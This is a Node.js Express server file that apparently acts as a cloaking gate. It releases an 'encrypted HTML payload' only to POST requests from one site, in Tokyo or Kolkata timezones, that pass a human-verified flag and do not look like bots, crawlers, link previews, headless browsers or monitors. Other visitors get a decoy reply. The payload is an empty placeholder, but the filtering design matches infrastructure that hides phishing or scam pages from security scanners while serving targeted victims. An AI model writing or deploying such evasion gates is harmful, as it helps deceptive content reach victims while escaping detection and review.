const express = require("express");
const cors = require("cors");
const app = express();
const PORT = process.env.PORT || 3000;

const allowedTimezones = ["Asia/Tokyo", "Asia/Kolkata", "Asia/Calcutta"];
const encryptedPayload = encodeURIComponent(""); // Replace with your encrypted HTML

// Middleware to handle JSON
app.use(express.json());

// Only allow POST from your site
app.use((req, res, next) => {
  const origin = req.headers.origin || "";
  const referer = req.headers.referer || "";

  const isFromYourSite =
    origin.includes("northpoletravel.site") || referer.includes("northpoletravel.site");

  if (req.method === "OPTIONS") {
    // Handle CORS preflight if needed
    res.setHeader("Access-Control-Allow-Origin", "https://northpoletravel.site");
    res.setHeader("Access-Control-Allow-Methods", "POST");
    res.setHeader("Access-Control-Allow-Headers", "Content-Type");
    return res.sendStatus(204);
  }

  if (req.method !== "POST" || !isFromYourSite) {
    return res.status(403).json({
      error: "Forbidden",
      message: ``,
      statusCode: 403
    });
  }

  // Allow CORS for your frontend only
  res.setHeader("Access-Control-Allow-Origin", "https://northpoletravel.site");
  next();
});

// Basic bot detection
function isLikelyBot(req) {
  const ua = req.headers["user-agent"] || "";
  const botPatterns = [
    /bot/i, /crawl/i, /spider/i, /preview/i, /fetch/i,
    /python/i, /node/i, /scrape/i, /headless/i, /monitor/i
  ];
  return botPatterns.some((pattern) => pattern.test(ua));
}

app.post("/", (req, res) => {
  const { timezone, fullUrl, robotVerified } = req.body;
  const referer = req.headers["referer"] || "";
  const userAgent = req.headers["user-agent"] || "";

  const isValidTimezone = allowedTimezones.includes(timezone);
  const isValidUrl = typeof fullUrl === "string" && fullUrl.startsWith("https://northpoletravel.site");
  const isBot = isLikelyBot(req);
  const isHumanVerified = robotVerified === true;

  const isAllowed = isValidTimezone && isValidUrl && isHumanVerified && !isBot;

  console.table([
    {
      timezone,
      fullUrl,
      robotVerified,
      referer,
      userAgent,
      isValidTimezone,
      isValidUrl,
      isHumanVerified,
      isBot,
      status: isAllowed ? "✅ ALLOWED" : "❌ BLOCKED"
    }
  ]);

  if (!isAllowed) {
    return res.status(403).send("hi how are you"); // Friendly message for blocked requests
  }

  res.setHeader("Content-Type", "text/html");
  res.send(encryptedPayload);
});

// Block all other routes
app.all("*", (req, res) => {
  res.status(404).json({
    message: `Cannot ${req.method} ${req.originalUrl}`,
    error: "Not Found",
    statusCode: 404
  });
});

app.listen(PORT, () => {
  console.log(`✅ Secure server running on port ${PORT}`);
});

